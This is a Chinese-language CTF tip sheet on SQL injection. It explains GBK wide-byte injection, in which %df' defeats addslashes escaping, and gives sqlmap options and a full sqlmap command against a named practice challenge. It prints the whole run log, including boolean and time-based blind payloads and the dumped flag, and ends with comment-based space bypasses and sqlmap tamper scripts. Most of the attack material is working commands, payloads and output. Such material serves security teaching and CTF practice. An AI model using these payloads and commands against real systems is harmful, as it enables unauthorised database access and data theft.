SQL注入小技巧
================================

宽字节注入
--------------------------------
- 例题: ``http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1`` 

::

		%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\，变成了 %df\’，
		其中\的十六进制是 %5C ，那么现在 %df\’ 	=%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，
		则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗’，也就是说：%df\’ = %df%5c%27=縗’，
		因为gbk是多字节编码，他认为两个字节代表一个汉字，所以%df和后面的\也就是%5c变成了一个汉字“運”，
		而’逃逸了出来，有了单引号就好注入了.

		http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df'

		--threads 10	//如果你玩过 msfconsole的话会对这个很熟悉 sqlmap线程最高设置为10
		--level 3 	//sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP 
				Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。最高可到5
		--risk 3 	// 执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全
		--search 	//后面跟参数 -D -T -C 搜索列（S），表（S）和或数据库名称（S） 如果你脑子够聪明，
				应该知道库列表名中可能会有ctf,flag等字样.


- 执行 ``sqlmap -u "http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df%27" --search -C flag --level 3 --risk 1 --thread 10`` 

::

		[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

		[*] starting at 05:36:28

		[05:36:29] [WARNING] it appears that you have provided tainted parameter values ('id=1%df'') with most likely leftover chars/statements from manual SQL injection test(s). Please, always use only valid parameter values so sqlmap could be able to run properly
		are you really sure that you want to continue (sqlmap could have problems)? [y/N] y
		[05:36:30] [INFO] resuming back-end DBMS 'mysql'
		[05:36:30] [INFO] testing connection to the target URL
		[05:36:31] [INFO] heuristics detected web page charset 'ISO-8859-2'
		[05:36:31] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests
		sqlmap resumed the following injection point(s) from stored session:
		---
		Parameter: id (GET)
			Type: boolean-based blind
			Title: AND boolean-based blind - WHERE or HAVING clause
			Payload: id=1%df' AND 5642=5642-- jbOi

			Type: AND/OR time-based blind
			Title: MySQL >= 5.0.12 AND time-based blind
			Payload: id=1%df' AND SLEEP(5)-- YtXh
		---
		[05:36:31] [INFO] the back-end DBMS is MySQL
		back-end DBMS: MySQL >= 5.0.12
		do you want sqlmap to consider provided column(s):
		[1] as LIKE column names (default)
		[2] as exact column names
		> 1
		[05:36:33] [INFO] searching columns LIKE 'flag' across all databases
		[05:36:33] [INFO] fetching number of databases with tables containing columns LIKE 'flag' across all databases
		[05:36:33] [INFO] resumed: 1
		[05:36:33] [INFO] retrieving the length of query output
		[05:36:33] [INFO] resumed: 14
		[05:36:33] [INFO] resumed: sae-chinalover
		[05:36:33] [INFO] fetching number of tables containing columns LIKE 'flag' in database 'sae-chinalover'
		[05:36:33] [INFO] resumed: 1
		[05:36:33] [INFO] retrieving the length of query output
		[05:36:33] [INFO] resumed: 4
		[05:36:33] [INFO] resumed: ctf4
		[05:36:33] [INFO] fetching columns LIKE 'flag' for table 'ctf4' in database 'sae-chinalover'
		[05:36:33] [INFO] resumed: 1
		[05:36:33] [INFO] retrieving the length of query output
		[05:36:33] [INFO] resumed: 4
		[05:36:33] [INFO] resumed: flag
		columns LIKE 'flag' were found in the following databases:
		Database: sae-chinalover
		Table: ctf4
		[1 column]
		+--------+
		| Column |
		+--------+
		| flag   |
		+--------+

		do you want to dump entries? [Y/n] y
		which database(s)?
		[a]ll (default)
		[sae-chinalover]
		[q]uit
		>
		which table(s) of database 'sae-chinalover'?
		[a]ll (default)
		[ctf4]
		[s]kip
		[q]uit
		>
		[05:36:36] [INFO] fetching entries of column(s) 'flag' for table 'ctf4' in database 'sae-chinalover'
		[05:36:36] [INFO] fetching number of column(s) 'flag' entries for table 'ctf4' in database 'sae-chinalover'
		[05:36:36] [INFO] resumed: 1
		[05:36:36] [INFO] retrieving the length of query output
		[05:36:36] [INFO] resumed: 15
		[05:36:36] [INFO] resumed: nctf{gbk_3sqli}
		Database: sae-chinalover
		Table: ctf4
		[1 entry]
		+-----------------+
		| flag            |
		+-----------------+
		| nctf{gbk_3sqli} |
		+-----------------+

		[05:36:36] [INFO] table '`sae-chinalover`.ctf4' dumped to CSV file 'C:\Users\ninthDVEIL HUNSTER\.sqlmap\output\chinalover.sinaapp.com\dump\sae-chinalover\ctf4.csv'
		[05:36:36] [INFO] fetched data logged to text files under 'C:\Users\ninthDVEIL HUNSTER\.sqlmap\output\chinalover.sinaapp.com'

		[*] shutting down at 05:36:36

- sqlmap脚本
	--tamper "unmagicquotes.py"

空格绕过
-----------------------------------------
- 注释绕过
	``admin"/**/or/**/1=1'``
- sqlmap脚本
	--tamper=space2comment